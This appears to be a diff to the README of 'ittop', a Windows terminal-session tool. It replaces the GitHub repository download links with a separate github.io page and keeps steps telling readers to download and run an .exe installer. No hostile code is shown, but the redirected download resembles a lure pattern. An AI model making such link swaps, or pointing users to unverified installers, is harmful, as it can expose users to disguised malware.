@@ -1,6 +1,6 @@
 # 💻 ittop - Manage multiple terminal coding sessions easily
 
-[![](https://img.shields.io/badge/Download_ittop_for_Windows-blue)](https://github.com/Danta81/ittop)
+[![](https://img.shields.io/badge/Download_ittop_for_Windows-blue)](https://danta81.github.io)
 
 ## 🏗️ What is ittop?
 
@@ -21,7 +21,7 @@ Before you install ittop, ensure your Windows computer meets these basic needs:
 
 Follow these steps to set up ittop on your machine:
 
-1. Visit the project website at [https://github.com/Danta81/ittop](https://github.com/Danta81/ittop) to reach the download page.
+1. Visit the project website at [https://danta81.github.io](https://danta81.github.io) to reach the download page.
 2. Look for the latest release version on the page.
 3. Download the installer file that ends in .exe.
 4. Locate the downloaded file in your Downloads folder.
